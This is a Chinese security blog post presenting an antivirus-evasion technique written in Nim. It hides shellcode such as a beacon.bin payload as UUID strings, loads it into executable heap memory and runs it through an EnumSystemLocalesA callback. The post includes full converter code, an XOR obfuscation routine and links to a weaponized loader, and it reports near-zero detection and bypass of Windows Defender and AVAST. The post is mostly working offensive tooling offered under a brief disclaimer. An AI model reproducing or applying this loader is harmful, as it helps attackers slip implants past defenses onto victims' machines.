## 免责声明

本文中提到并不是什么新技术，仅为基于个人爱好的研究笔记，文中使用到的代码都是公开的，网上可以找到。文中提供程序(方法)可能带有攻击性，仅供安全研究与教学之用，用户将其信息做其他用途，由用户承担全部法律及连带责任。

## nim-lang: UUID shellcode execution(过所有杀软)

Nim（最初叫 Nimrod）是一门命令式静态类型编程语言，可以被编译成 C 或
JavaScript。它是开源的，维护很活跃，还结合了来自成熟语言（如Python，Ada和Modula）的成功概念。

Nim具有高效性，生成的执行文件小，编译器支持所有平台，非常适合嵌入式硬实时系统，支持各种后端编译等等，Nim强大的宏系统和独立性，接下来将介绍如何利用Nim结合一些未被大规模滥用的winapi进行免杀。

## 过程分析

![截图](https://image.3001.net/images/20210510/1620648948_609923f47267064328b77.png!small)

### 第一步，创建并分配堆内存

    
    
    HANDLE HeapCreate(
      DWORD  flOptions,
      SIZE_T dwInitialSize,
      SIZE_T dwMaximumSize
    );
    

HeapCreate 函数原型如上，在这里第一个参数必须是“ **HEAP_CREATE_ENABLE_EXECUTE**
”，否则当我们试图在来自堆的内存块中执行代码时，系统会抛出EXCEPTION_ACCESS_VIOLATION异常。其他两个参数设置为0即可，其中dwMaximumSize为0，表示堆内存大小是可增长的，其大小仅受限于系统可用内存大小。

    
    
    DECLSPEC_ALLOCATOR LPVOID HeapAlloc(
      HANDLE hHeap,
      DWORD  dwFlags,
      SIZE_T dwBytes
    );
    

接下来，使用 HeapAlloc 函数在刚创建的堆上分配内存。本次测试用 dwBytes为 0x100000，也就是申请了 1MB大小的内存。

### 第二步，将shellcode植入堆内存

这里使用了 UuidFromStringA 函数。

    
    
    RPC_STATUS UuidFromStringA(
      RPC_CSTR StringUuid,
      UUID     *Uuid
    );
    

首先，我们使用 UuidToStringA 函数将 shellcode 转成 string UUID，运行时再使用 UuidFromStringA
将其提出来放入上一步分配的堆内存。具体怎么实现往下看。

### 第三步，触发执行

![截图](https://image.3001.net/images/20210510/1620648950_609923f68389f9c00fcb9.bmp!small)

这里用到 EnumSystemLocalesA 函数，原型如上图。关于通过函数回调执行shellcode，我在之前两篇文章中有提到：

[Shellcode Injection via
Callbacks](https://www.freebuf.com/articles/web/269158.html)

[nim-lang 免杀测试：回调函数结合隐写术](https://www.freebuf.com/articles/system/272031.html)

在这里通过 lpLocaleEnumProc 参数指定回调函数，能达到类似效果的函数还有很多。

## 将 bytes 转成 string UUID

### python 版本

使用python实现比较简单，如下将 shellcode bytes 转成 string GUID。

![截图](https://image.3001.net/images/20210510/1620648951_609923f72414d66bdffda.bmp!small)

完整代码：https://github.com/ChoiSG/UuidShellcodeExec/blob/main/shellcodeToUUID.py

### nim-lang版本

这里用到 UuidToStringA 函数，此函数的作用是将 binary UUID 转成 string UUID。

    
    
    RPC_STATUS UuidToStringA(
      const UUID *Uuid,
      RPC_CSTR   *StringUuid
    );
    

那么怎么将 bytes 转成 binary UUID呢。

    
    
    var uid: UUID
    var shellcode = "\xEF\x8B\x74\x1F\x1C\x48\x01\xFE\x8B\x34\xAE\x48\x01\xF7\x99\xFF"
    copyMem(addr uid, addr shellcode[0], len(shellcode))
    echo type(uid)
    echo uid
    

以上代码输出：

GUID  
(Data1: 527731695, Data2: 18460, Data3: 65025, Data4: [139, 52, 174, 72, 1,
247, 153, 255])

UUID是一个由4个连字号(-)将32个字节长的字符串分隔后生成的字符串，总共36个字节长。比如：550e8400-e29b-41d4-a716-446655440000。GUID
是微软对UUID这个标准的实现。UUID是由开放软件基金会（OSF）定义的。UUID还有其它各种实现，不止GUID一种。

在winim模块中也可见其定义：

![截图](https://image.3001.net/images/20210510/1620648951_609923f7b2c713106ffcb.bmp!small)

完整代码如下

编译：nim c convertToUUID.nim

使用：convertToUUID.exe beacon.bin

生成的 string UUID 会保持到当前目录下 uuid.txt 文件中。

    
    
    #[
        Author: StudyCat
        Blog: https://www.cnblogs.com/studycat
        Github: https://github.com/StudyCat404/myNimExamples
    
        References:
            - https://github.com/ChoiSG/UuidShellcodeExec/blob/main/shellcodeToUUID.py
    ]#
    import winim
    import os
        
    proc convertToUUID(shellcode: var seq[byte]) =  
        var 
            fileName = "uuid.txt"
            outFile: File
        outFile = open(fileName, fmAppend)    
        if len(shellcode) div 16 != 0 :
            for i in 1..(16 - (len(shellcode) mod 16)):
                shellcode.add(0x00)
        else:
            echo "test"
        for i in 0..(len(shellcode) div 16 - 1):
            var 
                s = i*16
                e = s+15
                buf = shellcode[s..e]
                uid: UUID
                uidStr: RPC_CSTR
                line = ""
                
            copyMem(addr uid, addr buf[0], len(buf))
            UuidToStringA(addr uid, addr uidStr)
            line = "\"" & $uidStr & "\","
            outFile.writeLine(line)
        outFile.close()
     
    proc convertToUUID(fileName: string) =
        if fileExists(fileName):
            echo "Convert ", fileName, " to string UUID"
            echo "Output file: uuid.txt"
            var f: File
            f = open(fileName,fmRead)   
            var fileSize = f.getFileSize()
            var shellcode = newSeq[byte](fileSize)
            discard readBytes(f,shellcode,0,fileSize)
            convertToUUID(shellcode)
            f.close()
        else:
            echo "The system cannot find the file specified."
        
    proc help() =
        let pathSplit = splitPath(paramStr(0))
        echo "Usage:"
        echo "\t", pathSplit.tail, " filename"
    
    when defined(windows):
        when isMainModule:
            if paramCount() > 0:
                var p1 = paramStr(1)
                if p1 in ["/?","-h","--help"]:
                    help()
                else:
                    convertToUUID(p1)
            else:
                help()
    

## 武器化

在这方面 @byt3bl33d3r 已经走在前面了，[
**uuid_exec_bin.nim**](https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/uuid_exec_bin.nim)以下是免杀测试结果。你会发现
50 个杀软仅有1个识别出有问题（见“virscan扫描结果I”），但我想要的是全绿。所以决定对 string
UUID进行加密，这里使用异或进行测试（最终全绿，见“virscan扫描结果 II”）。

### 异或加密

    
    
    proc gkkaekgaEE(s: string, key: int): string {.noinline.} =
      # We need {.noinline.} here because otherwise C compiler
      # aggresively inlines this procedure for EACH string which results
      # in more assembly instructions
      var k = key
      result = string(s)
      for i in 0 ..< result.len:
        for f in [0, 8, 16, 24]:
          result[i] = chr(uint8(result[i]) xor uint8((k shr f) and 0xFF))
        k = k +% 1
    

![截图](https://image.3001.net/images/20210510/1620648952_609923f85b864b0a39e32.bmp!small)

当把样本上传virscan或者virustotal扫描的时候，就意味着很快就难逃杀软了，本着学习的心态还是可以的。

本文章所有代码可见：https://github.com/StudyCat404/uuid_exec_shellcode

## 免杀测试

### virscan扫描结果 I

> Scanner results:2%Antivirus software(1/50)found malware!

唯一被杀的是一款来自奥地利的杀软 ikarus，提示是“Virus.Win32.Meterpreter”，可能是 shellcode 没有做加密的缘故。

扫描结果：https://r.virscan.org/language/en/report/2ed921b27767d89806ae45fb3c1fc78b

### virscan扫描结果 II

![截图](https://image.3001.net/images/20210510/1620648953_609923f9ea0b9f6119080.bmp!small)

扫描结果：https://tinyurl.com/j6khk3f4

### 本地测试

本地测试 windows defender 和 AVAST 均通过。

![截图](https://image.3001.net/images/20210510/1620648954_609923fa8ee18b009f2ae.bmp!small)

![截图](https://image.3001.net/images/20210510/1620648955_609923fb29b44347686b4.bmp!small)

## 引用

> https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-> execution-method/
>
> https://github.com/ChoiSG/UuidShellcodeExec
>
> http://ropgadget.com/posts/abusing_win_functions.html
>
> https://blog.sunggwanchoi.com/eng-uuid-shellcode-execution/
>
>
> https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/uuid_exec_bin.nim

